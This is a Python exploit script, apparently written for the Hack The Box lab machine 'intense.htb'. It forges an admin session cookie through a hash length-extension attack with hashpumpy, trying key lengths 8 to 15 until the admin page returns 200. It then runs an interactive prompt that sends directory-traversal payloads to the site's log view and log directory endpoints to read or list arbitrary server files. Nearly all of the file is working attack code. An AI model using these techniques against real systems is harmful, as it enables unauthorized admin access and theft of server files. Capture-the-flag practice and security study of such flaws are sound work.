#!/usr/bin/env python3
from hashpumpy import hashpump
from binascii import hexlify,unhexlify
from base64 import b64decode,b64encode
import requests
import sys

headers = { "Host": "intense.htb",
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
"Accept-Language": "en-US,en;q=0.5",
"Accept-Encoding": "gzip, deflate",
"Referer": "http://intense.htb/home",
"DNT":"1",
"Connection": "close",
"Cookie" : "",
"Upgrade-Insecure-Requests": "1",
"Cache-Control": "max-age=0"
}

sec_part = sys.argv[1]
known_data = 'username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;'
to_append = ';username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;'
sec_to_hash = hexlify(b64decode(sec_part))
cooked = False

for key_length in range(8,16):
    pumped_hash, new_msg = hashpump(sec_to_hash, known_data, to_append, key_length)
    cookie = (b64encode(new_msg)+b'.'+b64encode(unhexlify(pumped_hash))).decode()
    headers["Cookie"] = f"auth={cookie}"

    if(requests.get("http://intense.htb/admin",headers=headers).status_code == 200):
        print(cookie)
        cooked = True
        break

if not cooked:
    print("valid admin cookie not found")

else:
    headers["Content-Type"] = 'application/x-www-form-urlencoded'
    while True:
        name = input("Kaushik's Shell$ ")
        if name[-1] != '/':
            url = "http://intense.htb/admin/log/view"
            data = f"logfile=../../../../../../../../../../../{name}"
        else:
            url = "http://intense.htb/admin/log/dir"
            data = f"logdir=../../../../../../../../../../../{name}"
        try:
            result = requests.post(url,data=data,headers=headers).text
            if result[0] == '[':
                result = result[1:-1].split(',')
                print('\n'.join(list(i[i.index('\'')+1:-1] for i in result)))
            else:
                print(result)
        except:
            continue
        
        # url = "http://intense.htb/admin/log/view"
        # files = list(i[i.index('\'')+1:-1] for i in result)
        # for line in files:
        #     data = f"logfile=../../../../../../../../../../../{name}{line}"
        #     print()
        #     print(line)
        #     print()
        #     result = requests.post(url,data=data,headers=headers).text
        #     print(result)
